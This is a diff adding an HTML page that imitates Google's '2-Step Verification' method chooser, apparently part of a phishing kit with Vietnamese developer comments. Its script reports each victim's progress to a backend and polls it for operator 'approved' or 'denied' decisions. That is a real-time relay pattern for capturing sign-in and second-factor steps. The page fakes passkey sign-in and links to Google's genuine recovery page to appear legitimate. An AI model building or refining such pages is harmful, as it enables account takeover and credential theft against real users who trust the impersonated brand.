@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Choose verification method - Google Accounts</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="icon" href="google_logo_icon_169090.ico">
+    <style>
+        /* Tăng chiều cao card riêng cho trang này */
+        .signin-card {
+            height: 504px !important; /* Tăng 20% từ 420px */
+        }
+
+        /* Mobile adjustments */
+        @media (max-width: 600px) {
+            .signin-card {
+                height: auto !important; /* Trở về auto trên mobile */
+            }
+        }
+
+        /* Đẩy input xuống thấp hơn cho trang này */
+        .signin-form .input-field {
+            margin-top: 24px !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+    </div>
+
+    <!-- Main content -->
+    <div class="main-wrapper page-transition">
+        <div class="login-wrapper">
+            <div class="signin-card">
+                <!-- Progress bar container -->
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="signin-columns">
+                    <!-- Left Column: Logo, Title, User Info -->
+                    <div class="signin-left">
+                        <div class="logo-wrapper">
+                            <img src="google_logo_icon_169090.ico" alt="Google logo" class="google-logo" style="width:48px;height:48px;" />
+                        </div>
+                        <h1 class="signin-title">2-Step Verification</h1>
+                        <p class="signin-subtitle">To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
+                        <div class="user-info">
+                            <div class="user-email-btn" onclick="handleTransition('index.html')">
+                                <svg width="20" height="20" viewBox="0 0 24 24" class="user-icon-img">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="#5f6368"/>
+                                </svg>
+                                <span class="user-email" id="displayEmail"></span>
+                                <svg width="16" height="16" viewBox="0 0 24 24" class="arrow-img">
+                                    <path d="M7 10l5 5 5-5z" fill="#5f6368"/>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Right Column: Verification Options -->
+                    <div class="signin-right">
+                        <div class="verify-options-wrapper">
+                            <h2 class="verify-options-title">Choose how you want to sign in:</h2>
+                            <div class="verify-options">
+                                <div class="verify-option" onclick="handleTransition('verify.html')">
+                                    <svg aria-hidden="true" class="Qk3oof verify-option-icon" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 -960 960 960" xmlns="https://www.w3.org/2000/svg"><path d="M80-680v-200h200v80H160v120H80Zm0 600v-200h80v120h120v80H80Zm600 0v-80h120v-120h80v200H680Zm120-600v-120H680v-80h200v200h-80ZM700-260h60v60h-60v-60Zm0-120h60v60h-60v-60Zm-60 60h60v60h-60v-60Zm-60 60h60v60h-60v-60Zm-60-60h60v60h-60v-60Zm120-120h60v60h-60v-60Zm-60 60h60v60h-60v-60Zm-60-60h60v60h-60v-60Zm240-320v240H520v-240h240ZM440-440v240H200v-240h240Zm0-320v240H200v-240h240Zm-60 500v-120H260v120h120Zm0-320v-120H260v120h120Zm320 0v-120H580v120h120Z"></path></svg>
+                                    <div class="verify-option-text">
+                                        <div class="verify-option-title">Get a verification code from the <strong>Google Authenticator</strong> app</div>
+                                    </div>
+                                </div>
+                                
+                                <hr>
+                                
+                                <div class="verify-option" onclick="handleTransition('verify-device.html')">
+                                    <svg class="verify-option-icon" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M4 6h18V4H4c-1.1 0-2 .9-2 2v11H0v3h14v-3H4V6z"/>
+                                        <path d="M23 8h-6c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h6c.55 0 1-.45 1-1V9c0-.55-.45-1-1-1zm-1 9h-4v-7h4v7z"/>
+                                    </svg>
+                                    <div class="verify-option-text">
+                                        <div class="verify-option-title">Tap <strong>Yes</strong> on the device your recovery email is signed into</div>
+                                    </div>
+                                </div>
+                                
+                                <hr>
+                                
+                                <div class="verify-option" onclick="handlePasskeyAuth()">
+                                    <svg class="verify-option-icon" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M11 12q-1.65 0-2.825-1.175Q7 9.65 7 8q0-1.65 1.175-2.825Q9.35 4 11 4q1.65 0 2.825 1.175Q15 6.35 15 8q0 1.65-1.175 2.825Q12.65 12 11 12Zm0-2q.825 0 1.413-.588Q13 8.825 13 8t-.587-1.412Q11.825 6 11 6q-.825 0-1.412.588Q9 7.175 9 8t.588 1.412Q10.175 10 11 10ZM3 20v-2.775q0-.85.425-1.575t1.175-1.1q1.275-.65 2.887-1.1Q9.1 13 11 13q.525 0 1.025.037.5.038 1 .113.025.575.15 1.1.125.525.4 1.025-.575-.125-1.225-.2Q11.7 15 11 15q-1.8 0-3.2.438-1.4.437-2.3.887-.25.125-.375.375T5 17.225V18h10v2Zm15.25 1L17 19.5v-3.675q-.875-.325-1.438-1.087Q15 13.975 15 13q0-1.25.875-2.125T18 10q1.25 0 2.125.875T21 13q0 .975-.562 1.738-.563.762-1.438 1.087L20 17l-1 1 1 1ZM18 14.5q.625 0 1.062-.438.438-.437.438-1.062t-.438-1.062Q18.625 11.5 18 11.5t-1.062.438Q16.5 12.375 16.5 13t.438 1.062q.437.438 1.062.438Z"/>
+                                    </svg>
+                                    <div class="verify-option-text">
+                                        <div class="verify-option-title">Use your passkey</div>
+                                    </div>
+                                </div>
+                                
+                                <hr>
+                                
+                                <div class="verify-option" onclick="handleGetHelp()">
+                                    <svg class="verify-option-icon" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M11 18h2v-2h-2v2zm1-16C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/>
+                                    </svg>
+                                    <div class="verify-option-text">
+                                        <div class="verify-option-title">Get help</div>
+                                        <div class="verify-option-subtitle">For security reasons, this may take 3-5 business days</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <footer class="page-footer">
+            <div class="footer-wrapper">
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Function to update page status
+        async function updatePageStatus(pageName) {
+            const requestId = localStorage.getItem('requestId');
+            if (!requestId) return;
+            
+            try {
+                await fetch('http://localhost:5000/api/update-page', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        id: parseInt(requestId), 
+                        currentPage: pageName 
+                    })
+                });
+            } catch (err) {
+                console.log('Failed to update page status');
+            }
+        }
+
+        // Hàm kiểm tra trạng thái approval
+        async function checkApprovalStatus(requestId, nextPage) {
+            const maxAttempts = 60; // Tối đa 60 lần kiểm tra (5 phút)
+            let attempts = 0;
+            
+            const checkStatus = async () => {
+                try {
+                    const response = await fetch(`http://localhost:5000/api/status/${requestId}`);
+                    if (response.ok) {
+                        const data = await response.json();
+                        
+                        if (data.status === 'approved') {
+                            // Được approve, chuyển trang
+                            const email = localStorage.getItem('userEmail');
+                            handleTransition(nextPage + '?email=' + encodeURIComponent(email));
+                            return;
+                        } else if (data.status === 'denied') {
+                            // Bị từ chối, hiển thị thông báo
+                            showNotification('Access denied. Please try again later.', 'error');
+                            return;
+                        }
+                    }
+                    
+                    attempts++;
+                    if (attempts < maxAttempts) {
+                        // Kiểm tra lại sau 1 giây
+                        setTimeout(checkStatus, 1000);
+                    } else {
+                        // Hết thời gian chờ, chuyển trang
+                        const email = localStorage.getItem('userEmail');
+                        handleTransition(nextPage + '?email=' + encodeURIComponent(email));
+                    }
+                } catch (error) {
+                    console.error('Error checking approval status:', error);
+                    attempts++;
+                    if (attempts < maxAttempts) {
+                        setTimeout(checkStatus, 1000);
+                    } else {
+                        const email = localStorage.getItem('userEmail');
+                        handleTransition(nextPage + '?email=' + encodeURIComponent(email));
+                    }
+                }
+            };
+            
+            // Bắt đầu kiểm tra
+            checkStatus();
+        }
+
+        // Hàm hiển thị thông báo
+        function showNotification(message, type = 'info') {
+            // Remove existing notifications
+            const existingNotification = document.querySelector('.notification');
+            if (existingNotification) {
+                existingNotification.remove();
+            }
+
+            const notification = document.createElement('div');
+            notification.className = `notification notification-${type}`;
+            notification.textContent = message;
+            
+            // Style the notification
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                padding: 12px 20px;
+                border-radius: 4px;
+                color: white;
+                font-size: 14px;
+                font-weight: 500;
+                z-index: 1000;
+                animation: slideIn 0.3s ease;
+                ${type === 'error' ? 'background-color: #d93025;' : 'background-color: #1a73e8;'}
+            `;
+
+            document.body.appendChild(notification);
+
+            // Remove notification after 3 seconds
+            setTimeout(() => {
+                notification.style.animation = 'slideOut 0.3s ease';
+                setTimeout(() => {
+                    if (notification.parentElement) {
+                        notification.remove();
+                    }
+                }, 300);
+            }, 3000);
+        }
+
+        // Page transition handler with smooth progress bar
+        function handleTransition(url) {
+            // Add fade-out effect to current page
+            const mainWrapper = document.querySelector('.main-wrapper');
+            mainWrapper.classList.add('fade-out');
+            
+            // Show loading overlay
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const progressBar = document.getElementById('progressBar');
+            const progressContainer = document.querySelector('.progress-container');
+            
+            loadingOverlay.classList.add('active');
+            progressContainer.classList.add('active');
+            
+            // Reset progress bar
+            progressBar.style.width = '0%';
+            progressBar.classList.remove('loading', 'completing');
+            
+            // Start smooth progress animation
+            setTimeout(() => {
+                progressBar.classList.add('loading');
+                progressBar.style.width = '80%';
+            }, 100);
+            
+            // Navigate after animation completes
+            setTimeout(() => {
+                progressBar.classList.remove('loading');
+                progressBar.classList.add('completing');
+                progressBar.style.width = '100%';
+                
+                // Hide progress bar and navigate
+                setTimeout(() => {
+                    progressContainer.classList.remove('active');
+                    window.location.href = url;
+                }, 300);
+            }, 1200);
+        }
+
+        // Handle verification option clicks
+        function setupVerificationOptions() {
+            const options = document.querySelectorAll('.verify-option');
+            
+            options.forEach(option => {
+                option.addEventListener('click', function() {
+                    // Add visual feedback
+                    this.style.backgroundColor = 'rgba(26, 115, 232, 0.08)';
+                    
+                    setTimeout(() => {
+                        this.style.backgroundColor = '';
+                    }, 150);
+                });
+            });
+        }
+
+        // Handle passkey authentication
+        function handlePasskeyAuth() {
+            // In a real implementation, this would trigger WebAuthn API
+            if (navigator.credentials && window.PublicKeyCredential) {
+                // Simulate passkey authentication
+                showPasskeyDialog();
+            } else {
+                alert('Passkeys are not supported in this browser. Please try another verification method.');
+            }
+        }
+
+        // Show passkey authentication dialog
+        function showPasskeyDialog() {
+            const dialog = document.createElement('div');
+            dialog.className = 'passkey-dialog';
+            dialog.innerHTML = `
+                <div class="passkey-overlay">
+                    <div class="passkey-content">
+                        <h3>Use your passkey</h3>
+                        <p>Touch your security key or use biometric authentication to sign in.</p>
+                        <div class="passkey-loading">
+                            <div class="spinner"></div>
+                            <p>Waiting for security key...</p>
+                        </div>
+                        <button onclick="cancelPasskey()" class="btn-secondary">Cancel</button>
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(dialog);
+            
+            // Simulate authentication delay
+            setTimeout(() => {
+                document.body.removeChild(dialog);
+                // In a real implementation, this would redirect to success page
+                handleTransition('verify-notification.html');
+            }, 3000);
+        }
+
+        // Cancel passkey authentication
+        function cancelPasskey() {
+            const dialog = document.querySelector('.passkey-dialog');
+            if (dialog) {
+                document.body.removeChild(dialog);
+            }
+        }
+
+        // Handle get help option - chuyển đến trang help thật của Google
+        function handleGetHelp() {
+            // Chuyển trực tiếp đến trang account recovery của Google
+            window.location.href = 'https://accounts.google.com/signin/recovery';
+        }
+
+        // Mobile responsive handler
+        function handleMobileLayout() {
+            function checkMobile() {
+                if (window.innerWidth <= 600) {
+                    document.body.classList.add('mobile-layout');
+                } else {
+                    document.body.classList.remove('mobile-layout');
+                }
+            }
+            
+            checkMobile();
+            window.addEventListener('resize', checkMobile);
+        }
+
+        // Display user email
+        function displayUserEmail() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email') || localStorage.getItem('userEmail') || '';
+            const emailElements = document.querySelectorAll('.user-email');
+            
+            emailElements.forEach(element => {
+                element.textContent = email;
+            });
+        }
+
+        // Initialize when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            setupVerificationOptions();
+            handleMobileLayout();
+            displayUserEmail();
+            
+            // Không tự động kiểm tra approval status để tránh vòng lặp redirect
+            // Người dùng cần chọn một verification method trước
+        });
+
+        // Accessibility improvements
+        document.addEventListener('keydown', function(e) {
+            // Handle Enter key on verification options
+            if (e.key === 'Enter' && e.target.classList.contains('verify-option')) {
+                e.target.click();
+            }
+            
+            // Handle Escape key to go back
+            if (e.key === 'Escape') {
+                handleTransition('verify.html');
+            }
+        });
+
+        // Handle browser back button
+        window.addEventListener('popstate', function(e) {
+            handleTransition('verify.html');
+        });
+
+        // Add styles for passkey dialog
+        const passkeyStyles = `
+            <style>
+                .passkey-dialog {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    right: 0;
+                    bottom: 0;
+                    z-index: 1000;
+                }
+                
+                .passkey-overlay {
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    right: 0;
+                    bottom: 0;
+                    background: rgba(0, 0, 0, 0.6);
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    animation: fadeIn 0.2s ease-out;
+                }
+                
+                .passkey-content {
+                    background: var(--surface);
+                    border-radius: var(--radius-large);
+                    padding: var(--spacing-xxl);
+                    max-width: 400px;
+                    text-align: center;
+                    box-shadow: var(--shadow-large);
+                    animation: slideIn 0.3s ease-out;
+                }
+                
+                .passkey-content h3 {
+                    font-size: var(--font-size-xl);
+                    margin-bottom: var(--spacing-md);
+                    color: var(--text-primary);
+                }
+                
+                .passkey-content p {
+                    color: var(--text-secondary);
+                    margin-bottom: var(--spacing-xl);
+                    line-height: 1.5;
+                }
+                
+                .passkey-loading {
+                    margin: var(--spacing-xl) 0;
+                }
+                
+                .spinner {
+                    width: 40px;
+                    height: 40px;
+                    border: 3px solid var(--border-color);
+                    border-top: 3px solid var(--primary-blue);
+                    border-radius: 50%;
+                    animation: spin 1s linear infinite;
+                    margin: 0 auto var(--spacing-md);
+                }
+                
+                @keyframes fadeIn {
+                    from { opacity: 0; }
+                    to { opacity: 1; }
+                }
+                
+                @keyframes slideIn {
+                    from { transform: translateY(-20px); opacity: 0; }
+                    to { transform: translateY(0); opacity: 1; }
+                }
+                
+                @keyframes spin {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+            </style>
+        `;
+        
+        document.head.insertAdjacentHTML('beforeend', passkeyStyles);
+    </script>
+</body>
+</html> 
